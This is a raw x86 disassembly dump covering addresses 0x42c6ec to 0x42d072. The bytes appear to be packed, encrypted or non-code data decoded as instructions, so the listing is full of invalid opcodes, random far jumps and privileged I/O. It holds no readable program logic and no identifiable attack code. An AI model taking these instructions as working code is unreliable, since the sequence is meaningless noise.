  42c6ec:	sub    al,BYTE PTR [ebx-0x6a]
  42c6ef:	scas   eax,DWORD PTR es:[di]
  42c6f1:	iret   
  42c6f2:	jmp    0x42c689
  42c6f4:	jp     0x42c6dd
  42c6f6:	mov    esp,0x6c6bd6f
  42c6fb:	xor    bh,BYTE PTR [ebx]
  42c6fd:	jb     0x42c705
  42c6ff:	sub    DWORD PTR [edi],ecx
  42c701:	or     ch,ch
  42c703:	adc    eax,0x78890ba5
  42c708:	imul   edi,DWORD PTR [edx-0x16],0x660a2dca
  42c70f:	xor    dl,BYTE PTR [eax-0xc]
  42c712:	cmp    ebp,DWORD PTR [edx-0x17]
  42c715:	lea    esp,[ebx+0x1d]
  42c718:	and    edi,ecx
  42c71a:	push   esi
  42c71b:	push   ebx
  42c71c:	in     al,dx
  42c71d:	mov    edx,DWORD PTR [ebx-0x47f9f946]
  42c723:	mov    ?,WORD PTR [edi-0x5e3f7140]
  42c729:	push   esp
  42c72a:	into   
  42c72b:	jg     0x42c6e8
  42c72d:	test   DWORD PTR [esi-0x73],ecx
  42c730:	sbb    dl,BYTE PTR [ebp+0x71aac448]
  42c736:	inc    esp
  42c737:	sahf   
  42c738:	les    ecx,FWORD PTR [edi]
  42c73a:	mov    ecx,0x5f698c84
  42c73f:	mov    eax,0x375cdf4e
  42c744:	aas    
  42c745:	sbb    al,al
  42c747:	jb     0x42c6c9
  42c749:	or     DWORD PTR [esi-0x48],0xffffffaa
  42c74d:	imul   edx,DWORD PTR [ebx+0x79],0xfffffffb
  42c751:	dec    esi
  42c752:	(bad)  
  42c753:	push   eax
  42c754:	pop    edx
  42c755:	lock out 0xdd,al
  42c758:	stos   BYTE PTR es:[edi],al
  42c759:	sub    al,dl
  42c75b:	sbb    BYTE PTR [edi],al
  42c75d:	and    ax,0xb819
  42c761:	sub    BYTE PTR [esp+ebx*8],cl
  42c764:	sbb    al,BYTE PTR [ebp-0x48]
  42c767:	sti    
  42c768:	call   0xa6c8:0xbe0e53cf
  42c76f:	mov    dh,0x36
  42c771:	ja     0x42c760
  42c773:	jge    0x42c79a
  42c775:	or     edx,edi
  42c777:	push   ds
  42c778:	xchg   ebp,eax
  42c779:	test   BYTE PTR [ebx],cl
  42c77b:	aad    0xb8
  42c77d:	loop   0x42c787
  42c77f:	push   0x38b9b1c0
  42c784:	push   esp
  42c785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c786:	inc    esp
  42c787:	js     0x42c7dd
  42c789:	dec    edx
  42c78a:	ins    DWORD PTR es:[edi],dx
  42c78b:	fsubr  DWORD PTR [ecx+ebx*4+0x3568]
	...
  42c7f2:	add    BYTE PTR [eax],al
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	mov    dl,0x13
  42c802:	push   esi
  42c803:	jmp    0x44a3fc
  42c808:	add    al,0x1
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	ret    0xf2e3
  42c80f:	pop    esp
  42c810:	std    
  42c811:	mov    ds,WORD PTR [edx-0x61]
  42c814:	out    0x2e,al
  42c816:	test   BYTE PTR [ebx+0x5c6de665],cl
  42c81c:	mov    al,0xfb
  42c81e:	rcr    BYTE PTR [eax+0x4f],cl
  42c821:	and    eax,0x4970e1b8
  42c826:	cmp    DWORD PTR [esi+0xb],0xb26a21e0
  42c82d:	and    al,0x33
  42c82f:	mov    DWORD PTR [ebp+0x590e510f],edi
  42c835:	pop    edi
  42c836:	push   esi
  42c837:	aad    0x25
  42c839:	cli    
  42c83a:	test   eax,0x5e0ce726
  42c83f:	lea    ebx,[edi+esi*8]
  42c842:	dec    ebp
  42c843:	push   es
  42c844:	adc    al,BYTE PTR [ecx+0x13]
  42c847:	(bad)  
  42c849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c84a:	cli    
  42c84b:	dec    edx
  42c84c:	lds    ecx,FWORD PTR [ebp-0x3b]
  42c84f:	outs   dx,BYTE PTR cs:[esi]
  42c851:	jmp    0x88a2c4d7
  42c856:	dec    ebp
  42c857:	mov    eax,0x7084548a
  42c85c:	loop   0x42c7fa
  42c85e:	sub    eax,0x98d59595
  42c863:	push   ds
  42c864:	ret    0xea31
  42c867:	je     0x42c82b
  42c869:	data16 int3 
  42c86b:	dec    edi
  42c86c:	xor    al,0x75
  42c86e:	mov    ah,0x32
  42c870:	jae    0x42c8bb
  42c872:	cmp    ah,BYTE PTR ss:[edx]
  42c875:	xchg   BYTE PTR [ebp+ecx*1+0x51583599],cl
  42c87c:	and    esi,DWORD PTR ds:0xf6e17760
  42c882:	adc    al,0x56
  42c884:	loopne 0x42c8b9
  42c886:	aas    
  42c887:	jbe    0x42c8b6
  42c889:	jmp    0x5b18:0xed7d8a1f
  42c890:	(bad)  
  42c891:	sub    eax,0xb87e29d7
  42c896:	daa    
  42c897:	loopne 0x42c8c3
  42c899:	aas    
  42c89a:	in     al,0x98
  42c89c:	and    al,0x9d
  42c89e:	xor    DWORD PTR [ecx+0x2c3ed04d],ebp
  42c8a4:	mov    WORD PTR [edi-0xa],ss
  42c8a7:	imul   ebp,DWORD PTR [edi-0x21],0x4fd876aa
  42c8ae:	mov    esp,0x43df0e1b
  42c8b3:	adc    ah,dl
  42c8b5:	rol    DWORD PTR [ebx+0x72],0x6e
  42c8b9:	jecxz  0x42c88a
  42c8bb:	and    BYTE PTR [ecx],0xa2
  42c8be:	cld    
  42c8bf:	dec    ecx
  42c8c0:	in     al,dx
  42c8c1:	pop    ebx
  42c8c2:	or     eax,0xa51429c4
  42c8c7:	or     DWORD PTR ds:0x37f29ba0,0x42dfcbed
  42c8d1:	xchg   ebp,eax
  42c8d2:	push   ds
  42c8d3:	ins    BYTE PTR es:[edi],dx
  42c8d4:	das    
  42c8d5:	push   eax
  42c8d6:	and    al,0x59
  42c8d8:	or     BYTE PTR [esi-0x5f],0x9a
  42c8dc:	xlat   BYTE PTR ds:[ebx]
  42c8dd:	loopne 0x42c8b6
  42c8df:	retf   
  42c8e0:	pusha  
  42c8e1:	ud0    eax,DWORD PTR [edi+ebp*8]
  42c8e5:	stc    
  42c8e6:	jbe    0x42c8ef
  42c8e8:	cwd    
  42c8ea:	mov    al,ds:0xd3a870c6
  42c8ef:	ret    
  42c8f0:	int3   
  42c8f1:	mov    edx,0x30bccdbd
  42c8f6:	xchg   ebp,eax
  42c8f7:	clc    
  42c8f8:	sahf   
  42c8f9:	or     BYTE PTR [esp+eiz*4],al
  42c8fc:	sahf   
  42c8fd:	fisttp QWORD PTR [eax]
  42c8ff:	add    cl,BYTE PTR [edi-0x3]
  42c902:	cmp    ebx,edi
  42c904:	fldcw  WORD PTR [ecx-0x355eec31]
  42c90a:	xor    eax,DWORD PTR [edi]
  42c90c:	scas   eax,DWORD PTR es:[edi]
  42c90d:	stos   BYTE PTR es:[edi],al
  42c90e:	sub    DWORD PTR [edi],0x0
	...
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xe687599e
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	mov    ?,WORD PTR [ecx]
  42c98e:	fmul   st(4),st
  42c990:	stos   BYTE PTR es:[edi],al
  42c991:	inc    ebp
  42c992:	je     0x42c96b
  42c994:	ins    DWORD PTR es:[edi],dx
  42c995:	rol    DWORD PTR [esi-0x2d],cl
  42c998:	imul   BYTE PTR [edx+eiz*4-0x3]
  42c99c:	outs   dx,DWORD PTR ds:[esi]
  42c99d:	sbb    al,al
  42c99f:	loopne 0x42ca16
  42c9a1:	push   eax
  42c9a2:	lock fs out 0x68,al
  42c9a6:	mov    DWORD PTR [edi-0x53aad83c],eax
  42c9ac:	in     eax,0x27
  42c9ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9af:	dec    esi
  42c9b0:	lds    ebx,FWORD PTR [edi+0x2872fcaf]
  42c9b6:	lods   eax,DWORD PTR ds:[esi]
  42c9b7:	mov    cl,0xfd
  42c9b9:	xor    esi,DWORD PTR [edx]
  42c9bb:	daa    
  42c9bc:	pop    edx
  42c9bd:	jecxz  0x42ca16
  42c9bf:	mov    bl,bh
  42c9c1:	push   es
  42c9c2:	int    0x35
  42c9c4:	scas   eax,DWORD PTR es:[edi]
  42c9c5:	dec    ecx
  42c9c6:	(bad)  
  42c9c7:	jb     0x42c974
  42c9c9:	xchg   ecx,eax
  42c9ca:	sbb    eax,0x35772a39
  42c9cf:	adc    DWORD PTR gs:[eax+ebx*1],0xffffffb3
  42c9d4:	jmp    0x42c985
  42c9d6:	bnd ret 0x393
  42c9da:	retf   
  42c9db:	cs cli 
  42c9dd:	ss mov ds,esi
  42c9e0:	test   al,0x9e
  42c9e2:	xchg   ecx,ebp
  42c9e4:	int3   
  42c9e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c9e6:	push   esi
  42c9e7:	or     BYTE PTR [edi+0x33],al
  42c9ea:	fwait
  42c9eb:	stos   DWORD PTR es:[edi],eax
  42c9ec:	or     ecx,edx
  42c9ee:	inc    ebx
  42c9ef:	or     DWORD PTR [ecx+0x1d],edi
  42c9f2:	js     0x42c983
  42c9f4:	pop    edx
  42c9f5:	addr16 mov esp,0x9255c720
  42c9fb:	jbe    0x42c9c7
  42c9fd:	inc    ebp
  42c9fe:	sbb    al,0x85
  42ca00:	cwde   
  42ca01:	xor    cl,BYTE PTR [ebp+0x26081586]
  42ca07:	inc    eax
  42ca08:	(bad)  
  42ca09:	hlt    
  42ca0a:	fild   DWORD PTR [eax-0x6467ae6]
  42ca10:	leave  
  42ca11:	lea    ecx,[ebp-0x29]
  42ca14:	retw   
  42ca16:	(bad)  
  42ca17:	or     al,0x84
  42ca19:	and    bl,ch
  42ca1b:	dec    edx
  42ca1c:	outs   dx,DWORD PTR ds:[esi]
  42ca1d:	mov    DWORD PTR [ecx+0x23df93cb],edx
  42ca23:	sub    eax,0x6477dd95
  42ca28:	aam    0xb1
  42ca2a:	outs   dx,BYTE PTR ds:[esi]
  42ca2b:	sub    ebx,DWORD PTR [edx]
  42ca2d:	xor    ebx,edx
  42ca2f:	fsubrp st(4),st
  42ca31:	sbb    dh,ah
  42ca33:	fistp  WORD PTR [eax]
  42ca35:	and    BYTE PTR [edx-0x16fb2564],ah
  42ca3b:	stos   BYTE PTR es:[edi],al
  42ca3c:	fld    DWORD PTR [ecx+0x1d553bcd]
  42ca42:	cli    
  42ca43:	cld    
  42ca44:	mov    esi,0x184c6ae4
  42ca49:	add    BYTE PTR [edi+0x61],al
  42ca4c:	loopne 0x42ca5c
  42ca4e:	cmc    
  42ca4f:	jae    0x42c9e0
  42ca51:	xchg   ebp,eax
  42ca52:	je     0x42c9d7
  42ca54:	cmp    BYTE PTR [ecx-0x4f],bl
  42ca57:	stos   BYTE PTR es:[edi],al
  42ca58:	jno    0x42cac5
  42ca5a:	mov    ds:0x4dd8d326,eax
  42ca5f:	xor    eax,0xcbae30a
  42ca64:	or     DWORD PTR [eax],ebx
  42ca66:	(bad)  
  42ca67:	adc    eax,DWORD PTR [esi+edx*4+0x476a83ef]
  42ca6e:	ret    
  42ca6f:	sbb    dh,BYTE PTR [eax+0x35694b1a]
  42ca75:	and    dl,BYTE PTR [ecx]
  42ca77:	icebp  
  42ca78:	and    edi,esp
  42ca7a:	pushf  
  42ca7b:	cli    
  42ca7c:	mov    DWORD PTR [ebx],esp
  42ca7e:	xor    BYTE PTR [esi],dh
  42ca80:	outs   dx,BYTE PTR ds:[esi]
  42ca81:	mov    ebx,0x8a7e6f68
  42ca86:	mov    ecx,0x3108aa05
  42ca8b:	lea    esp,[eax-0x6d]
  42ca8e:	fidiv  WORD PTR [ebx+0x0]
	...
  42caf1:	add    BYTE PTR [eax],al
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x65866ec0]
  42cb02:	fs jl  0x42cb01
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	inc    esp
  42cb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb0e:	imul   ecx,DWORD PTR gs:[bx+si+0x55],0xd503f049
  42cb17:	sub    DWORD PTR [edx+eiz*4+0x71ddd321],edx
  42cb1e:	ret    
  42cb1f:	retf   
  42cb20:	fdiv   QWORD PTR [esi+0x2be77a24]
  42cb26:	fbstp  TBYTE PTR [edi]
  42cb28:	cli    
  42cb29:	adc    ebp,DWORD PTR [edx]
  42cb2b:	mov    al,ds:0xb2e5791d
  42cb30:	rcr    BYTE PTR ds:0x4a888a70,1
  42cb36:	mov    ebp,0xaa66f0d3
  42cb3b:	repz test BYTE PTR [ebp+edi*2+0x16],cl
  42cb40:	sar    BYTE PTR [edx],1
  42cb42:	push   ds
  42cb43:	adc    eax,DWORD PTR [eax+eax*1+0x12ce5afa]
  42cb4a:	jnp    0x42caf2
  42cb4c:	push   ss
  42cb4d:	or     DWORD PTR [edi+0x1099b331],esp
  42cb53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb54:	repz push cs
  42cb56:	mov    edi,0x8492e5c6
  42cb5b:	jp     0x42cbca
  42cb5d:	cdq    
  42cb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb5f:	mov    ch,dl
  42cb61:	xchg   esp,eax
  42cb62:	dec    esi
  42cb63:	fs inc ecx
  42cb65:	(bad)  
  42cb66:	mov    ch,0xd2
  42cb68:	pop    ss
  42cb69:	dec    ebx
  42cb6a:	fldcw  WORD PTR [edx]
  42cb6c:	adc    eax,0x13835c2e
  42cb71:	loop   0x42cb19
  42cb73:	lock sub eax,0x2b62515f
  42cb79:	push   eax
  42cb7a:	idiv   DWORD PTR [edi]
  42cb7c:	fsubr  QWORD PTR [edx]
  42cb7e:	mov    dl,0xea
  42cb80:	scas   eax,DWORD PTR es:[edi]
  42cb81:	mov    ebx,0x33dc775f
  42cb86:	push   eax
  42cb87:	pushf  
  42cb88:	call   0x9139:0x844e0fac
  42cb8f:	cld    
  42cb90:	cwde   
  42cb91:	mov    ah,0xe4
  42cb93:	mov    eax,DWORD PTR [eax-0x43]
  42cb96:	inc    ebx
  42cb97:	mov    ch,0x3
  42cb99:	cwde   
  42cb9a:	icebp  
  42cb9b:	jno    0x42cb39
  42cb9d:	jno    0x42cbbf
  42cb9f:	cmp    edx,esp
  42cba1:	mov    dl,0xe0
  42cba3:	and    ch,al
  42cba5:	mov    esp,edx
  42cba7:	cmp    BYTE PTR [ebp+0x5e],0xd9
  42cbab:	cmp    dl,ch
  42cbad:	jg     0x42cbae
  42cbaf:	or     esi,DWORD PTR [edi-0x11]
  42cbb2:	bound  ebp,QWORD PTR [eax]
  42cbb4:	das    
  42cbb5:	sub    BYTE PTR [edx+0x54595ae7],bl
  42cbbb:	dec    ebp
  42cbbc:	jle    0x42cc01
  42cbbe:	fdivr  QWORD PTR [edx]
  42cbc0:	cwde   
  42cbc1:	push   esi
  42cbc2:	cmp    eax,0x8339f129
  42cbc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cbc8:	cmp    ebx,DWORD PTR [ebx]
  42cbca:	fadd   DWORD PTR [esi+ebp*2+0x1ed0ad35]
  42cbd1:	in     al,dx
  42cbd2:	sbb    dl,al
  42cbd4:	mov    WORD PTR [eax],?
  42cbd6:	lods   al,BYTE PTR ds:[esi]
  42cbd7:	jmp    0x42cbc3
  42cbd9:	dec    edi
  42cbda:	or     DWORD PTR [edi],0xffffffc9
  42cbdd:	xchg   BYTE PTR [esi-0x71f472e6],bh
  42cbe3:	leave  
  42cbe4:	sbb    al,0x38
  42cbe6:	mov    dl,0xb6
  42cbe8:	push   esi
  42cbe9:	test   BYTE PTR [edi+eiz*2+0x28],bh
  42cbed:	cwde   
  42cbee:	int    0x79
  42cbf0:	mov    ds:0xfa9ee86b,al
  42cbf5:	ret    0xd2a
  42cbf8:	pop    edi
  42cbf9:	sbb    BYTE PTR [eax+0x2a57ddc2],al
  42cbff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc00:	mov    BYTE PTR [ebx],ch
  42cc02:	aam    0xa1
  42cc04:	imul   esi,DWORD PTR [edi+0x38],0xffffffb3
  42cc08:	inc    esp
  42cc09:	pushf  
  42cc0a:	push   ebp
  42cc0b:	pop    ebx
  42cc0c:	mov    cl,0xe5
  42cc0e:	imul   ecx,DWORD PTR [esi+0x0],0x0
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x1328514c
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	pop    ecx
  42cc8d:	cmp    bh,cl
  42cc8f:	adc    bl,BYTE PTR [edx+0x59]
  42cc92:	jno    0x42cc8b
  42cc94:	add    DWORD PTR [eax-0x3013105c],ebp
  42cc9a:	(bad)  
  42cc9b:	jl     0x42ccef
  42cc9d:	mov    ds:0xd484516d,eax
  42cca2:	clc    
  42cca3:	leave  
  42cca4:	in     al,dx
  42cca5:	fcmovu st,st(3)
  42cca7:	xlat   BYTE PTR ds:[ebx]
  42cca8:	enter  0xd94d,0xa5
  42ccac:	cmp    bl,BYTE PTR [edx+ebx*8+0x2482c540]
  42ccb3:	adc    bh,bh
  42ccb5:	jge    0x42ccde
  42ccb7:	mov    ah,0x88
  42ccb9:	mov    bl,BYTE PTR [ecx]
  42ccbb:	out    0xc0,eax
  42ccbd:	pop    es
  42ccbe:	sbb    al,BYTE PTR [esi-0x5857f5f4]
  42ccc4:	xor    al,0xae
  42ccc6:	adc    BYTE PTR [ebx-0x23],bl
  42ccc9:	aas    
  42ccca:	sbb    cl,BYTE PTR [eax]
  42cccc:	(bad)  
  42cccd:	in     al,0x1e
  42cccf:	add    bl,BYTE PTR [eax]
  42ccd1:	push   es
  42ccd2:	xchg   ebp,eax
  42ccd3:	jmp    0x3c6e18e9
  42ccd8:	sub    al,0x9d
  42ccda:	adc    ecx,DWORD PTR [esi-0x380c279a]
  42cce0:	pop    esp
  42cce1:	imul   eax,DWORD PTR [ebx-0x6f674318],0x351086a8
  42cceb:	sbb    eax,0xd4665f1a
  42ccf0:	xor    DWORD PTR [eax+0x3de91133],0xffffffb7
  42ccf7:	mov    edi,0x6db52677
  42ccfc:	jl     0x42cce5
  42ccfe:	test   BYTE PTR [edx-0x33bd9a86],bl
  42cd04:	and    BYTE PTR [esi+0xf],ch
  42cd07:	jae    0x42ccfa
  42cd09:	mov    dh,0x4d
  42cd0b:	test   DWORD PTR [ebx-0x3f],0x6cf02349
  42cd12:	mov    esp,0x3a86eac3
  42cd17:	sbb    eax,0xf950db2b
  42cd1c:	aas    
  42cd1d:	enter  0xfc82,0x51
  42cd21:	jle    0x42ccc9
  42cd23:	std    
  42cd24:	test   al,0xe2
  42cd26:	dec    eax
  42cd27:	jge    0x42cd1a
  42cd29:	xor    eax,0x2c9b9e23
  42cd2e:	imul   edx,DWORD PTR [ebx+0x62fe8228],0x64
  42cd35:	pop    ds
  42cd36:	ret    
  42cd37:	sbb    DWORD PTR [esi],0xc41decde
  42cd3d:	xchg   ebp,eax
  42cd3e:	retf   0x1b43
  42cd41:	dec    ebp
  42cd42:	mov    ds:0x1f366ee3,eax
  42cd47:	push   ebp
  42cd48:	sti    
  42cd49:	or     DWORD PTR [edx+0x22],esi
  42cd4c:	jnp    0x42cd54
  42cd4e:	cmp    ebp,DWORD PTR [eax-0x2d]
  42cd51:	or     al,0x49
  42cd53:	fwait
  42cd54:	shl    ebx,cl
  42cd56:	mov    ah,0x7d
  42cd58:	adc    esi,0xfc05bf3e
  42cd5e:	sbb    ebx,edx
  42cd60:	shl    BYTE PTR [edx-0x69],0x49
  42cd64:	cwde   
  42cd65:	or     edi,ecx
  42cd67:	lock fnsave [eax]
  42cd6a:	pushf  
  42cd6b:	icebp  
  42cd6c:	clc    
  42cd6d:	lahf   
  42cd6e:	push   ebx
  42cd6f:	adc    al,0x13
  42cd71:	int    0x61
  42cd73:	imul   edx,DWORD PTR [esi+0x5375d13e],0x75fd192a
  42cd7d:	adc    eax,0x4d52b5da
  42cd82:	iret   
  42cd83:	inc    ecx
  42cd84:	test   BYTE PTR [edx-0xf224864],bh
  42cd8a:	pslld  mm4,mm3
  42cd8d:	jl     0x42cde6
  42cd8f:	lods   eax,DWORD PTR ds:[esi]
	...
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xe9
  42ce01:	jno    0x42ce4b
  42ce03:	retf   0xe004
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	ins    DWORD PTR es:[edi],dx
  42ce0d:	aaa    
  42ce0e:	xchg   esi,eax
  42ce0f:	cld    
  42ce10:	(bad)  
  42ce12:	mov    esp,0xd7750caa
  42ce17:	mov    BYTE PTR [ebp-0x67acc618],cl
  42ce1d:	add    ebp,edi
  42ce1f:	shr    DWORD PTR cs:[ecx],cl
  42ce22:	mov    al,0x53
  42ce24:	cmp    DWORD PTR [esi],ebp
  42ce26:	dec    ebp
  42ce28:	xor    bl,BYTE PTR [eax-0x80]
  42ce2b:	xchg   BYTE PTR [edx-0x70],cl
  42ce2e:	sbb    edi,DWORD PTR [esi]
  42ce30:	cmp    bl,BYTE PTR [edx]
  42ce32:	add    ecx,edx
  42ce34:	pusha  
  42ce35:	push   esi
  42ce36:	mov    edi,esp
  42ce38:	cs std 
  42ce3a:	and    BYTE PTR [edi],bl
  42ce3c:	adc    edi,DWORD PTR [ebx]
  42ce3e:	pushf  
  42ce3f:	cwde   
  42ce40:	nop
  42ce41:	pop    edi
  42ce42:	jns    0x42cde0
  42ce44:	pushf  
  42ce45:	arpl   WORD PTR [edx],si
  42ce47:	xchg   DWORD PTR [ebp+edi*8+0x5b653c11],ebx
  42ce4e:	xor    ch,BYTE PTR [edi-0x7e3aea62]
  42ce54:	push   0x21
  42ce56:	push   ss
  42ce57:	dec    esi
  42ce58:	or     eax,0x7c7b81eb
  42ce5d:	or     edi,esp
  42ce5f:	xchg   edi,eax
  42ce60:	rcl    BYTE PTR [ebp+0x459cba18],0x10
  42ce67:	cmp    eax,0x560c4f71
  42ce6c:	add    eax,0x3bace4aa
  42ce71:	in     al,0xb1
  42ce73:	inc    ebx
  42ce74:	es gs jns 0x42ce74
  42ce78:	cld    
  42ce79:	inc    ecx
  42ce7a:	xor    ah,BYTE PTR [edx+0x70b99f97]
  42ce80:	xor    eax,0x5798f8c7
  42ce85:	dec    ebx
  42ce86:	hlt    
  42ce87:	xchg   ebx,eax
  42ce88:	mov    esp,0xf7bfa088
  42ce8d:	call   0x2dfc:0xbf92ca0e
  42ce94:	test   eax,0xf9aa4908
  42ce99:	ret    0xf36
  42ce9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce9d:	add    DWORD PTR [eax-0x6d],eax
  42cea0:	pop    edi
  42cea1:	or     DWORD PTR [edx-0x20],edi
  42cea4:	add    edi,DWORD PTR [edx+ebx*1-0x1fba779a]
  42ceab:	imul   eax,DWORD PTR [ebx+0x45],0xfffffffe
  42ceaf:	mov    ds:0xb88242bc,eax
  42ceb4:	pmullw mm0,QWORD PTR [ecx]
  42ceb7:	inc    ecx
  42ceb8:	sbb    BYTE PTR [esi-0x2cd610e3],cl
  42cebe:	pop    ecx
  42cebf:	pop    edi
  42cec0:	clc    
  42cec1:	mov    ecx,0xf44d53c6
  42cec6:	jno    0x42ced3
  42cec8:	and    ebp,DWORD PTR [eax+0x2c]
  42cecb:	mov    DWORD PTR [esi],ebx
  42cecd:	push   ss
  42cece:	pop    ebx
  42cecf:	retf   
  42ced0:	mov    DWORD PTR [esi+0x6139cb7e],0x2bf13346
  42ceda:	movups xmm1,XMMWORD PTR fs:[edi]
  42cede:	xlat   BYTE PTR ds:[ebx]
  42cedf:	xor    DWORD PTR [edx],esi
  42cee1:	xor    ebp,DWORD PTR [ebp+0x5bae88e7]
  42cee7:	loop   0x42ceee
  42cee9:	sti    
  42ceea:	add    bl,BYTE PTR [edi+0x2e]
  42ceed:	int3   
  42ceee:	mov    dl,0x69
  42cef0:	ss enter 0x2594,0x58
  42cef5:	dec    ebx
  42cef6:	add    ebx,DWORD PTR [edi-0x4a]
  42cef9:	stos   DWORD PTR es:[edi],eax
  42cefa:	sti    
  42cefb:	test   BYTE PTR [edi+0x3a],bh
  42cefe:	jno    0x42cec0
  42cf00:	cmc    
  42cf01:	and    al,0x70
  42cf03:	ins    BYTE PTR es:[edi],dx
  42cf04:	sbb    al,0x3e
  42cf06:	(bad)  
  42cf07:	mov    eax,0x779a6407
  42cf0c:	ins    BYTE PTR es:[edi],dx
  42cf0d:	js     0x42ceb4
  42cf0f:	test   BYTE PTR [eax],al
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    eax,FWORD PTR [ecx+0x69]
  42cf82:	pop    es
  42cf83:	xchg   ecx,eax
  42cf84:	or     cl,ah
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	out    dx,eax
  42cf8d:	inc    edi
  42cf8e:	add    eax,0xe309abdd
  42cf93:	sub    BYTE PTR [eax+eiz*8+0x20],0xdb
  42cf98:	(bad)  
  42cf99:	mov    esi,0xfdce9601
  42cf9e:	sahf   
  42cf9f:	cs push ecx
  42cfa1:	fdivr  DWORD PTR [eax]
  42cfa3:	sar    BYTE PTR [ecx],1
  42cfa5:	xlat   BYTE PTR ds:[ebx]
  42cfa6:	std    
  42cfa7:	pop    edi
  42cfa8:	ja     0x42cf90
  42cfaa:	ds xchg ecx,eax
  42cfac:	jo     0x42cf41
  42cfae:	cmp    eax,0xfa5093a4
  42cfb3:	push   edi
  42cfb4:	inc    eax
  42cfb5:	push   ebp
  42cfb6:	add    ah,BYTE PTR [edx]
  42cfb8:	and    DWORD PTR [ebx+0x1337b457],esi
  42cfbe:	jbe    0x42cf52
  42cfc0:	mov    al,0x1e
  42cfc2:	retf   0xbee9
  42cfc5:	xchg   esi,eax
  42cfc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfc7:	lock inc ebp
  42cfc9:	cld    
  42cfca:	adc    BYTE PTR ss:[edx-0x6a340cc2],0xa7
  42cfd2:	(bad)  ds:0xbeaac865
  42cfd8:	pusha  
  42cfd9:	xchg   edx,eax
  42cfda:	into   
  42cfdb:	adc    esi,DWORD PTR [edi-0x7e8f633d]
  42cfe1:	xchg   edx,eax
  42cfe2:	jecxz  0x42cf85
  42cfe4:	push   ebx
  42cfe5:	ja     0x42d05b
  42cfe7:	mov    al,ds:0xc4c9aed3
  42cfec:	sbb    DWORD PTR cs:[esi+0x537b1c1b],esi
  42cff3:	sti    
  42cff4:	mov    eax,0x41f34c48
  42cff9:	jmp    0x2787:0x1ecac988
  42d000:	push   eax
  42d001:	adc    ebx,DWORD PTR [esi+0x4b]
  42d004:	(bad)  
  42d005:	adc    DWORD PTR [esi+0x41edd82f],esi
  42d00b:	mov    cs,WORD PTR [esi-0x14333e59]
  42d011:	pop    edi
  42d012:	or     DWORD PTR [edi],ecx
  42d014:	fs mov ecx,0xe438797c
  42d01a:	fsub   QWORD PTR ds:0xfb8f58e1
  42d020:	lods   eax,DWORD PTR ds:[esi]
  42d021:	xchg   edi,eax
  42d022:	jb     0x42d009
  42d024:	xor    al,0x8f
  42d026:	lea    eax,[edi+0x5aaa4419]
  42d02c:	popa   
  42d02d:	outs   dx,BYTE PTR ds:[esi]
  42d02e:	in     eax,0x6f
  42d030:	pop    ebp
  42d031:	cli    
  42d032:	ins    DWORD PTR es:[edi],dx
  42d033:	pop    esp
  42d034:	or     ebp,DWORD PTR [ecx+0x32939426]
  42d03a:	call   0x4ad6:0x2d266e36
  42d041:	mov    al,BYTE PTR [ecx-0x14]
  42d044:	xor    DWORD PTR [edx],esi
  42d046:	mov    bh,0xb5
  42d048:	adc    eax,0xd6236681
  42d04d:	outs   dx,BYTE PTR ds:[esi]
  42d04e:	cmp    eax,0xb1b53bf7
  42d053:	in     al,0x48
  42d055:	lods   al,BYTE PTR ds:[esi]
  42d056:	push   ebx
  42d057:	ja     0x42d094
  42d059:	sbb    al,0x32
  42d05b:	scas   eax,DWORD PTR es:[edi]
  42d05c:	es cld 
  42d05e:	retf   0x438c
  42d061:	push   0x25c8a8f9
  42d066:	pop    esi
  42d067:	mov    esp,cs
  42d069:	and    dl,BYTE PTR [edi-0x7]
  42d06c:	add    ebx,DWORD PTR [edx+0x5b]
  42d06f:	loope  0x42d0a7
  42d071:	retf   
  42d072:	sub    DWORD PTR [ecx-0x5d],0xffffffc1
